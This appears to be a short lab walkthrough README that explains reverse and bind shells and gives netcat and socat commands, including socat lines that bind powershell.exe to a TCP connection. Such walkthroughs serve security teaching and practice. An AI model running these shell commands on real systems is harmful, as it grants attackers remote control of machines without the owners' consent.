# Netcat

Before moving ahead lets understand the basic difference between Reverse shell and Bind shell

The main difference that in rev shell and bind shell is that in rev shell you establish
the listner in your machine whereas in the bind shell the compromisded machine will establish the listener.

In to get a clear idea lets perform the task.. and see whats the real difference is


The one that we created in the prev task was a webshell :0

**Netcat For REV-SHELL**

Open the cmd using the administrators permissions now simply type the command :

    nc <ip> port

There we go..

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/a1bdf8bc-e6dc-445b-ac92-35f155d05290)


This is a NETCAT reverse shell..


Now lets create a **Bind shell**

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/6ec413c7-24fb-4581-9335-c7fc2209abaa)


Now you can see the difference 

# SOCAT

- Socat rev-shell 
We will be using this command for listner :(in our machine)

      socat TCP-L:<PORT> -

Go to windows and execute this command:

    socat TCP:<LOCAL IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/4d711919-d314-49cd-90c9-444d5a7ed072)

There we gooo!!

- Socat bind shell

1. Commad:(in the compromised machine)

       socat TCP-L:<PORT> EXEC:powershell.exe,pipes

2. In your machine

       socat TCP:<LOCAL IP>:<LOCAL-PORT>
       
![image](https://github.com/Theincognitomode/What-the-shell/assets/73027020/0304dc7e-e064-4797-ad2b-dd61622f907b)


